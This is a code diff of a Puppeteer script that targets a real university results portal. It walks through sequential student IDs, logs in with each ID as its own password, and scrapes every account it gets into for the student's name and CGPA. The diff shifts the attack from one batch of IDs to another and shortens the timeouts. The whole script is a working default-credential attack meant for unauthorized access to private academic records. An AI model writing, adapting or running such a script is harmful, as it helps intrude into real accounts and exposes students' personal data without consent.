@@ -1,30 +1,33 @@
 const puppeteer = require("puppeteer");
 
 const baseUrl = "https://nubtkhulna.ac.bd/ter";
-const startId = 1061;
-const endId = 1100;
+const startId = 1;
+const endId = 40;
 
 (async () => {
     const browser = await puppeteer.launch({ headless: true });
     const page = await browser.newPage();
-    await page.setDefaultNavigationTimeout(60000); // set global 60s timeout
+    await page.setDefaultNavigationTimeout(10000); // set global 10s timeout
 
     const unchanged = [];
 
     for (let i = startId; i <= endId; i++) {
-        const userId = `CSE23012${String(i).padStart(3, "0")}`;
+
+        // Generate user ID in the format: ARCH1703200XX (with leading zeros)
+        const userId = `ARCH1703200${String(i).padStart(2, "0")}`;
+        // Log the user ID being checked
         console.log(`🔍 Trying: ${userId}`);
 
         try {
             // Go to login page
-            await page.goto(`${baseUrl}/login`, { waitUntil: "networkidle2", timeout: 60000 });
+            await page.goto(`${baseUrl}/login`, { waitUntil: "networkidle2", timeout: 10000 });
 
             // Fill and submit login form
             await page.type("#username", userId);
             await page.type("#password", userId);
             await Promise.all([
                 page.click("button[type=submit]"),
-                page.waitForNavigation({ waitUntil: "networkidle2", timeout: 60000 }),
+                page.waitForNavigation({ waitUntil: "networkidle2", timeout: 10000 }),
             ]);
 
             // Check if login was successful
@@ -34,7 +37,7 @@ const endId = 1100;
                 // Visit overall result page
                 await page.goto(`${baseUrl}/panel/overallresult`, {
                     waitUntil: "networkidle2",
-                    timeout: 60000,
+                    timeout: 10000,
                 });
 
                 // Extract name and CGPA
@@ -69,7 +72,7 @@ const endId = 1100;
                 // Sign out
                 await page.goto(`${baseUrl}/login/signout`, {
                     waitUntil: "networkidle2",
-                    timeout: 60000,
+                    timeout: 10000,
                 });
             } else {
                 console.log(`❌ Login failed: ${userId}`);
